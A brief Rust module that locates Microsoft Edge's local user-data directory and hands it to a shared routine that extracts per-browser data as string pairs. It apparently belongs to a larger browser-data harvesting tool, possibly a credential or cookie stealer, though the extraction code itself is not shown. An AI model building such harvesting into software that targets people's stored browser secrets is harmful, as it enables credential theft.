use super::base;

pub fn extract() -> Vec<(String, String)> {
    let user_data = crate::browsers::common::paths::user_data_path(
        &crate::browsers::common::paths::BrowserPath {
            name: "Edge".into(),
            exe: "msedge.exe".into(),
            user_data_rel: r"Microsoft\Edge\User Data".into(),
            root: crate::browsers::common::paths::DataRoot::Local,
            has_profiles: true,
        }
    );
    base::extract_for_browser("Edge", &user_data, true)
}
